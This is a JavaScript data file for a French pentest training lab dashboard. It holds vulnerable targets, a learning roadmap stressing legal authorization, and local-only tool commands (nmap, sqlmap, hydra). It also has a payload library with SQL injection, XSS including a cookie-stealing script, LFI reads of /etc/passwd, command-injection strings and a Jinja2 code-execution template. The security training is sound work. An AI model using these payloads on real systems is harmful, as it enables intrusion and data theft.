'use strict';

/**
 * Données statiques du labo : cibles, parcours d'apprentissage, aide-mémoire.
 * Séparé du serveur pour rester lisible et facile à enrichir.
 */

// --- Cibles vulnérables (doivent correspondre à docker-compose.yml) ---
const TARGETS = [
  {
    id: 'juiceshop',
    container: 'lab-juiceshop',
    name: 'OWASP Juice Shop',
    port: 3001,
    difficulty: 'Débutant → Expert',
    tags: ['Web', 'API', 'SPA'],
    blurb:
      "La boutique volontairement pourrie de l'OWASP. Des dizaines de défis notés, du plus simple au plus retors. La meilleure première cible.",
    creds: 'Compte à créer soi-même, ou trouver les comptes cachés',
    proxyOk: false,
    tip: 'Application Angular : passe par le tunnel SSH pour la voir, le proxy web la casse.',
  },
  {
    id: 'webgoat',
    container: 'lab-webgoat',
    name: 'OWASP WebGoat',
    port: 3003,
    difficulty: 'Débutant → Intermédiaire',
    tags: ['Web', 'Java', 'Leçons'],
    blurb:
      "Des leçons guidées où l'on exploite une faille pour valider chaque chapitre. Très pédagogique, on apprend en faisant.",
    creds: 'Compte à créer au premier lancement (page /WebGoat)',
    proxyOk: false,
    tip: "Ajoute /WebGoat à l'adresse. Passe par le tunnel SSH pour une expérience fluide.",
  },
];

// --- Parcours d'apprentissage (mois par mois) ---
const ROADMAP = [
  {
    id: 'm0',
    phase: 'Fondations',
    title: "Règles d'or & légalité",
    goal: "Comprendre ce qui est légal, et ne jamais franchir la ligne.",
    items: [
      "Un test d'intrusion exige une AUTORISATION ÉCRITE et un périmètre défini",
      "En France : accès frauduleux à un système = jusqu'à 3 ans de prison, 100 000 € (art. 323 du Code pénal)",
      "On s'entraîne UNIQUEMENT sur : ce labo, les plateformes dédiées, ou du bug bounty avec périmètre",
      "Toujours garder une trace écrite de l'autorisation avant toute mission",
    ],
    resources: [
      { name: 'Légiferance — art. 323-1 (accès frauduleux)', url: 'https://www.legifrance.gouv.fr/codes/article_lc/LEGIARTI000006418316' },
      { name: 'Code de conduite du hacker éthique (EC-Council)', url: 'https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/what-is-ethical-hacking/' },
    ],
  },
  {
    id: 'm1',
    phase: 'Fondations',
    title: 'Réseau : TCP/IP, DNS, HTTP',
    goal: 'Savoir comment une requête voyage, ce qu\'est un port, un paquet, une résolution DNS.',
    items: [
      'Modèle TCP/IP et OSI, notion de port et de socket',
      "Résolution DNS de bout en bout",
      'Anatomie d\'une requête/réponse HTTP (méthodes, en-têtes, codes)',
      'Observer une requête avec les outils de développement du navigateur',
    ],
    resources: [
      { name: 'Professor Messer — Network+ (gratuit, EN)', url: 'https://www.professormesser.com/network-plus/n10-008/n10-008-training-course/' },
      { name: 'MDN — Aperçu du protocole HTTP (FR)', url: 'https://developer.mozilla.org/fr/docs/Web/HTTP/Overview' },
    ],
  },
  {
    id: 'm2',
    phase: 'Fondations',
    title: 'Linux essentiel',
    goal: 'Vivre dans un terminal : fichiers, permissions, processus, réseau, scripts.',
    items: [
      'Navigation, gestion de fichiers, redirections et pipes',
      'Permissions (chmod, chown), utilisateurs et sudo',
      'Processus, services (systemd), journaux',
      'Utiliser le Terminal du tableau de bord pour tout pratiquer',
    ],
    resources: [
      { name: 'OverTheWire — Bandit (jeu, la référence)', url: 'https://overthewire.org/wargames/bandit/' },
      { name: 'Linux Journey (FR dispo)', url: 'https://linuxjourney.com/' },
    ],
  },
  {
    id: 'm3',
    phase: 'Le web',
    title: 'Le web en profondeur',
    goal: 'Comprendre sessions, cookies, authentification, même origine, avant d\'attaquer.',
    items: [
      'Cookies, sessions, jetons, stockage côté navigateur',
      'Politique de même origine (SOP) et CORS',
      "Comment fonctionne une authentification, un mot de passe haché",
      'Rejouer et modifier une requête à la main',
    ],
    resources: [
      { name: 'PortSwigger — Your first research (intro)', url: 'https://portswigger.net/web-security/getting-started' },
      { name: 'OWASP — Top 10 (la carte des failles web)', url: 'https://owasp.org/www-project-top-ten/' },
    ],
  },
  {
    id: 'm4',
    phase: 'Le web',
    title: 'Python & Bash pour l\'offensive',
    goal: 'Automatiser : écrire ses propres scripts plutôt que de dépendre des outils.',
    items: [
      'Python : requêtes HTTP (requests), manipulation de chaînes, fichiers',
      'Bash : boucles, arguments, enchaîner des outils',
      'Écrire un mini-script qui teste une liste de mots de passe sur DVWA (dans le labo)',
    ],
    resources: [
      { name: 'Automate the Boring Stuff with Python (gratuit)', url: 'https://automatetheboringstuff.com/' },
      { name: 'TryHackMe — Python for Pentesters', url: 'https://tryhackme.com/' },
    ],
  },
  {
    id: 'm5',
    phase: 'Attaque web',
    title: 'Failles web — OWASP Top 10',
    goal: 'Le cœur du métier : maîtriser injections, XSS, contrôle d\'accès, etc.',
    items: [
      'Injection SQL (manuelle puis avec sqlmap) — sur DVWA et Juice Shop',
      'XSS reflété, stocké, DOM',
      "Failles de contrôle d'accès (IDOR, élévation)",
      'Upload de fichiers, inclusion, SSRF',
      'Valider chaque type sur une cible du labo',
    ],
    resources: [
      { name: 'PortSwigger Web Security Academy (gratuit, LA référence)', url: 'https://portswigger.net/web-security' },
      { name: 'Root-Me — Web Client & Serveur (FR)', url: 'https://www.root-me.org/' },
    ],
  },
  {
    id: 'm6',
    phase: 'Attaque web',
    title: 'Reconnaissance & scanning',
    goal: 'Cartographier une cible : ports, services, arborescence, technologies.',
    items: [
      'Scan de ports et de services avec nmap (sur le labo)',
      'Découverte de répertoires avec ffuf / gobuster',
      'Identifier les technologies (whatweb)',
      'Scan de vulnérabilités connu avec nuclei',
    ],
    resources: [
      { name: 'HackTricks — méthodologie (EN)', url: 'https://book.hacktricks.xyz/' },
      { name: 'Onglet « Outils » de ce tableau de bord', url: '#outils' },
    ],
  },
  {
    id: 'm7',
    phase: 'Attaque web',
    title: 'Exploitation & après',
    goal: 'Prouver l\'impact : entrer, puis mesurer jusqu\'où on peut aller.',
    items: [
      'Enchaîner reconnaissance → faille → accès',
      'Notions d\'élévation de privilèges Linux',
      'Comprendre un reverse shell (dans le labo uniquement)',
      "Documenter chaque étape au fur et à mesure",
    ],
    resources: [
      { name: 'TryHackMe — Jr Penetration Tester (parcours)', url: 'https://tryhackme.com/path/outline/jrpenetrationtester' },
      { name: 'GTFOBins (élévation Linux)', url: 'https://gtfobins.github.io/' },
    ],
  },
  {
    id: 'm8',
    phase: 'Professionnalisation',
    title: 'Rapport & méthodologie',
    goal: 'La partie que le client paie : un rapport clair, reproductible, avec correctifs.',
    items: [
      'Structure d\'un rapport : résumé, criticité, preuve, remédiation',
      'Noter la criticité (CVSS)',
      'Rédiger un rapport sur une faille trouvée dans le labo',
    ],
    resources: [
      { name: 'PTES — Standard de test d\'intrusion', url: 'http://www.pentest-standard.org/' },
      { name: 'Exemples de rapports (public-pentesting-reports)', url: 'https://github.com/juliocesarfort/public-pentesting-reports' },
    ],
  },
  {
    id: 'm9',
    phase: 'Professionnalisation',
    title: 'Certifications & bug bounty',
    goal: 'Se rendre employable et commencer à gagner sa vie légalement.',
    items: [
      'eJPT — première certif accessible',
      'PNPT puis OSCP — les plus reconnues des recruteurs',
      'Premier programme de bug bounty (périmètre respecté !)',
    ],
    resources: [
      { name: 'YesWeHack (plateforme FR de bug bounty)', url: 'https://www.yeswehack.com/' },
      { name: 'INE / eLearnSecurity — eJPT', url: 'https://ine.com/' },
    ],
  },
];

// --- Aide-mémoire des outils (commandes cadrées sur le LABO local) ---
const TOOLS = [
  {
    id: 'nmap',
    name: 'nmap',
    role: 'Scan de ports et de services',
    commands: [
      { label: 'Scan rapide des ports du labo', cmd: 'nmap -sV -p 3001,3002,3003 127.0.0.1' },
      { label: 'Scan complet d\'une cible', cmd: 'nmap -sV -sC -p- 127.0.0.1' },
    ],
  },
  {
    id: 'ffuf',
    name: 'ffuf',
    role: 'Découverte de répertoires et fichiers',
    commands: [
      { label: 'Brute-force de répertoires sur DVWA', cmd: 'ffuf -u http://127.0.0.1:3002/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt' },
    ],
  },
  {
    id: 'gobuster',
    name: 'gobuster',
    role: 'Découverte de répertoires (alternative)',
    commands: [
      { label: 'Répertoires sur DVWA', cmd: 'gobuster dir -u http://127.0.0.1:3002 -w /usr/share/seclists/Discovery/Web-Content/common.txt' },
    ],
  },
  {
    id: 'sqlmap',
    name: 'sqlmap',
    role: 'Détection et exploitation d\'injections SQL',
    commands: [
      { label: 'Tester un paramètre (labo)', cmd: 'sqlmap -u "http://127.0.0.1:3002/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --cookie="PHPSESSID=...; security=low"' },
    ],
  },
  {
    id: 'nuclei',
    name: 'nuclei',
    role: 'Scan de vulnérabilités connues',
    commands: [
      { label: 'Scanner une cible du labo', cmd: 'nuclei -u http://127.0.0.1:3002' },
    ],
  },
  {
    id: 'whatweb',
    name: 'whatweb',
    role: 'Identifier les technologies',
    commands: [
      { label: 'Empreinte technologique', cmd: 'whatweb http://127.0.0.1:3002' },
    ],
  },
  {
    id: 'hydra',
    name: 'hydra',
    role: 'Brute-force d\'authentification (labo uniquement)',
    commands: [
      { label: 'Attaque du login DVWA', cmd: 'hydra -l admin -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt 127.0.0.1 -s 3002 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"' },
    ],
  },
];

module.exports = { TARGETS, ROADMAP, TOOLS };

// --- Missions (prestations autorisées pour de vrais clients) ---
const MISSION_CHECKLIST = [
  "Le contact est bien le PROPRIÉTAIRE du site (identité vérifiée, pas juste un pseudo Discord)",
  "Autorisation écrite et signée reçue, avec périmètre et dates précises",
  "L'hébergeur du site autorise les tests (beaucoup l'interdisent, même avec l'accord du propriétaire)",
  "Périmètre clair : domaines/URL autorisés ET liste de ce qui est hors-scope",
  "Fenêtre de test convenue (jour/heure) + contact d'urgence noté",
  "Sauvegarde du site faite par le propriétaire avant les tests",
  "Tu testes depuis une machine/adresse autorisée, PAS depuis un VPS qui l'interdit",
  "Aucun test destructif ni déni de service ; données clients jamais exfiltrées",
];

const SEVERITIES = [
  { id: 'critique', label: 'Critique', tone: 'bad' },
  { id: 'elevee', label: 'Élevée', tone: 'bad' },
  { id: 'moyenne', label: 'Moyenne', tone: 'warn' },
  { id: 'faible', label: 'Faible', tone: 'info' },
  { id: 'info', label: 'Info', tone: 'off' },
];

const MISSION_STATUSES = [
  { id: 'brouillon', label: 'Brouillon', tone: 'off' },
  { id: 'attente_autorisation', label: 'En attente d\'autorisation', tone: 'warn' },
  { id: 'autorisee', label: 'Autorisée', tone: 'info' },
  { id: 'en_cours', label: 'Tests en cours', tone: 'warn' },
  { id: 'rapport', label: 'Rapport rendu', tone: 'ok' },
  { id: 'cloturee', label: 'Clôturée', tone: 'ok' },
];

module.exports.MISSION_CHECKLIST = MISSION_CHECKLIST;
module.exports.SEVERITIES = SEVERITIES;
module.exports.MISSION_STATUSES = MISSION_STATUSES;

// --- Outils supplémentaires ---
TOOLS.push(
  {
    id: 'nikto', name: 'nikto', role: 'Scan de serveur web (mauvaises configs, fichiers connus)',
    commands: [{ label: 'Scan d\'un hôte du labo', cmd: 'nikto -h http://127.0.0.1:3001' }],
  },
  {
    id: 'wafw00f', name: 'wafw00f', role: 'Détecter un pare-feu applicatif (WAF)',
    commands: [{ label: 'Identifier le WAF', cmd: 'wafw00f http://127.0.0.1:3001' }],
  },
  {
    id: 'sslscan', name: 'openssl / sslscan', role: 'Analyser la configuration TLS',
    commands: [{ label: 'Détails du certificat', cmd: 'echo | openssl s_client -connect 127.0.0.1:443 2>/dev/null | openssl x509 -noout -subject -dates' }],
  },
  {
    id: 'wpscan', name: 'wpscan', role: 'Audit de sites WordPress (si applicable)',
    commands: [{ label: 'Énumérer un WordPress', cmd: 'wpscan --url http://127.0.0.1:3001 --enumerate p,t,u' }],
  },
  {
    id: 'subfinder', name: 'subfinder', role: 'Découverte de sous-domaines (passif)',
    commands: [{ label: 'Sous-domaines d\'un domaine', cmd: 'subfinder -d exemple.tld' }],
  },
  {
    id: 'httpx', name: 'httpx', role: 'Sonder des hôtes web en masse (statut, techno)',
    commands: [{ label: 'Sonder une liste d\'URL', cmd: 'httpx -status-code -title -tech-detect -u http://127.0.0.1:3001' }],
  }
);

// --- Bibliothèque de payloads (référence — à tester UNIQUEMENT sur le labo/cibles autorisées) ---
const PAYLOADS = [
  {
    id: 'sqli', name: 'Injection SQL',
    items: [
      { label: 'Contournement d\'authentification', value: "' OR '1'='1" },
      { label: 'Contournement (commentaire)', value: "admin'-- -" },
      { label: 'Basé sur l\'erreur', value: "' AND 1=CONVERT(int,(SELECT @@version))-- -" },
      { label: 'UNION (colonnes)', value: "' UNION SELECT NULL,NULL,NULL-- -" },
      { label: 'Basé sur le temps (MySQL)', value: "' OR SLEEP(5)-- -" },
    ],
  },
  {
    id: 'xss', name: 'XSS (Cross-Site Scripting)',
    items: [
      { label: 'Basique', value: '<script>alert(1)</script>' },
      { label: 'Image onerror', value: '<img src=x onerror=alert(1)>' },
      { label: 'SVG', value: '<svg onload=alert(1)>' },
      { label: 'Attribut (sortie de contexte)', value: '"><script>alert(1)</script>' },
      { label: 'Vol de cookie (démo labo)', value: "<script>new Image().src='http://127.0.0.1/?c='+document.cookie</script>" },
    ],
  },
  {
    id: 'lfi', name: 'Inclusion de fichier (LFI/RFI)',
    items: [
      { label: 'Fichier passwd (Linux)', value: '../../../../etc/passwd' },
      { label: 'Encodage null-byte (ancien PHP)', value: '../../../../etc/passwd%00' },
      { label: 'Filtre PHP (source)', value: 'php://filter/convert.base64-encode/resource=index.php' },
    ],
  },
  {
    id: 'cmd', name: 'Injection de commande',
    items: [
      { label: 'Chaînage', value: '; id' },
      { label: 'ET logique', value: '&& whoami' },
      { label: 'Sous-shell', value: '$(id)' },
      { label: 'Retour ligne + cmd', value: '%0a id' },
    ],
  },
  {
    id: 'ssti', name: 'SSTI (templates)',
    items: [
      { label: 'Détection', value: '{{7*7}}' },
      { label: 'Détection (autre moteur)', value: '${7*7}' },
      { label: 'Jinja2 (Python)', value: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" },
    ],
  },
  {
    id: 'creds', name: 'Identifiants par défaut à tester',
    items: [
      { label: 'admin / admin', value: 'admin:admin' },
      { label: 'admin / password', value: 'admin:password' },
      { label: 'root / root', value: 'root:root' },
      { label: 'admin / changeme', value: 'admin:changeme' },
      { label: 'test / test', value: 'test:test' },
    ],
  },
];

module.exports.PAYLOADS = PAYLOADS;

// --- Cible API vulnérable ---
TARGETS.push({
  id: 'vampi',
  container: 'lab-vampi',
  name: 'VAmPI (API vulnérable)',
  port: 3004,
  difficulty: 'Intermédiaire',
  tags: ['API', 'REST', 'Python'],
  blurb: "Une API REST volontairement vulnérable (OWASP API Security Top 10) : parfaite pour t'entraîner sur les failles d'API — auth cassée, accès non autorisé, injection.",
  creds: 'Initialise la base via GET /createdb, puis explore /users, /books',
  proxyOk: false,
  tip: 'API JSON : utilise le Terminal avec curl plutôt que le navigateur.',
});
